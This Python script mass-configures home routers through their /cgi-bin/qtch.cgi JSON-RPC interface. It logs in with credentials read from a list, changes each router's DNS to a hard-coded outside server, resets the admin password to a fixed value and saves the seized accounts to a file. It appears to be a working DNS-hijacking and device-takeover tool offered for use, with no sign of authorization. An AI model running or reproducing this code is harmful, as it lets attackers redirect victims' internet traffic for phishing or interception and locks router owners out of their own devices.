import requests
import json
import logging
from template import data_login, get_conf, wlan, set_pass
from jsdecode import encrypt_field
DNS = "79.134.3.101"
GOOGLE_DNS = "8.8.4.4"
NEW_PASSWORD = "12qwaszx"
TIMEOUT = 60

logging.basicConfig(filename='out.log', filemode='a', format='%(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

with open("accounts.txt") as f:
    accounts = f.readlines()

for router in accounts:
    ip, port, login_and_pass, *other = router.rstrip().split(" ")
    try:
        login_tmp, password_tmp = login_and_pass.rstrip().split(":")
        password = encrypt_field(login_tmp, password_tmp)
        login = encrypt_field(login_tmp, password, limit=2)
    except Exception as e:
        logger.error(e)
        print(f"invalid credentials {router}")
        continue
    credentials = {
            "data": {
                "username": login,
                "password": password
            }
        }

    data_login.get("params").append(credentials)

    rsession = requests.Session()
    json_data = json.dumps(data_login)

    print(f'Auth: {ip} Used: {login}:{password} TimeOut: {TIMEOUT}')

    try:
        resp = rsession.post(f"http://{ip}:{port}/cgi-bin/qtch.cgi", json_data, timeout=TIMEOUT)
    except (Exception, requests.Timeout) as e:
        logger.error(e)
        continue
    try:
        logger.info(f'status code: {resp.status_code}')

        body = resp.json()
        if body.get('error', False):
            logger.info(f'Error:: {body.get("error")}')
            print(f'Error:: {body.get("error")}')
        # {'jsonrpc': '2.0', 'id': 0, 'error': {'code': -32000, 'message': 'Access denied'}}
        session_id = body.get('result')[0].get('session_id')
        logger.info(f'session_id: {session_id}')

        get_conf.get("params")[0].update({
            "session_id": session_id
        })
    except:
        continue
    print(f'Get Settings: {ip} TimeOut: {TIMEOUT}')

    json_get_conf = json.dumps(get_conf)
    try:
        resp = rsession.post(f"http://{ip}:{port}/cgi-bin/qtch.cgi", json_get_conf,  timeout=TIMEOUT)
    except (Exception, requests.Timeout) as e:
        logger.error(e)
        continue
    try:
        wlan_body = resp.json()
        config_wan = wlan_body.get('result')[0].get('config').update({"dns_mode": 1, "ipoe_dns1": DNS, "ipoe_dns2":  GOOGLE_DNS})
        wlan.get("params")[0].update( {
            "session_id": session_id
        })
        wlan.get("params").append( {"data": {"wan": wlan_body.get('result')[0].get('config') }} )
    except:
        continue

    print(f'Update Settings: {ip} Used DNS: {DNS} AND GOOGLE DNS {GOOGLE_DNS} TimeOut: {TIMEOUT}')

    json_wlan_conf = json.dumps(wlan)
    try:
        resp = rsession.post(f"http://{ip}:{port}/cgi-bin/qtch.cgi", json_wlan_conf,  timeout=TIMEOUT)
    except (Exception, requests.Timeout) as e:
        logger.error(e)
        continue


    set_pass.get("params")[0].update( {
        "session_id": session_id
    })
    password = encrypt_field(login_tmp, NEW_PASSWORD)
    login = encrypt_field(login_tmp, password, limit=2)
    new_pass = {
        "data": {
            "username": login,
            "password": password
        }
    }
    set_pass.get("params").append(new_pass)

    print(f'SetUp Login: {login_tmp} Password: {NEW_PASSWORD}  TimeOut: {TIMEOUT}')

    json_set_pass = json.dumps(set_pass)
    try:
        resp = rsession.post(f"http://{ip}:{port}/cgi-bin/qtch.cgi", json_set_pass,  timeout=TIMEOUT)
    except (Exception, requests.Timeout) as e:
        logger.error(e)
        continue

    with open("new_accounts.txt", "a") as fh:
        fh.write(f"{ip}@{login_tmp}:{NEW_PASSWORD}\n")
